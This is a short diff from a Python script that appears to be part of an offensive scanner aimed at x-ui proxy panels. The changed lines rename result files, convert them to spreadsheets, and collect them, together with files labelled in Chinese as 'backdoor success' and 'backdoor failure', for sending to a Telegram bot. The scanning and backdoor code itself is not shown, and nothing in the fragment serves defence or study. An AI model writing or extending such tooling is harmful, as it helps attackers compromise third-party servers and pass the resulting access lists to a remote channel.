                 prefix = mode_map.get(TEMPLATE_MODE, "result")
 
+                final_txt_file = f"{prefix}-{time_str}.txt"
+                final_xlsx_file = f"{prefix}-{time_str}.xlsx"
+                
                 if os.path.exists("xui.txt"):
-                    final_result_file = f"{prefix}-{time_str}.txt"
-                    os.rename("xui.txt", final_result_file)
-                if os.path.exists("xui.xlsx"):
-                    os.rename("xui.xlsx", f"{prefix}-{time_str}.xlsx")
+                    os.rename("xui.txt", final_txt_file)
+                    run_ipcx(final_txt_file, final_xlsx_file)
+                
                 if os.path.exists("hmsuccess.txt"):
                     os.rename("hmsuccess.txt", f"后门成功-{time_str}.txt")
                 if os.path.exists("hmfail.txt"):
@@ -2565,11 +2618,11 @@ if __name__ == "__main__":
 
                 if BOT_TOKEN and CHAT_ID:
                     files_to_send = []
-                    if final_result_file and os.path.exists(final_result_file):
-                        files_to_send.append(final_result_file)
-                        xlsx_file = final_result_file.replace(".txt", ".xlsx")
-                        if os.path.exists(xlsx_file):
-                            files_to_send.append(xlsx_file)
+                    final_txt_file = f"{prefix}-{time_str}.txt"
+                    final_xlsx_file = f"{prefix}-{time_str}.xlsx"
+
+                    if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
+                    if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
                     
                     success_file = f"后门成功-{time_str}.txt"
                     fail_file    = f"后门失败-{time_str}.txt"
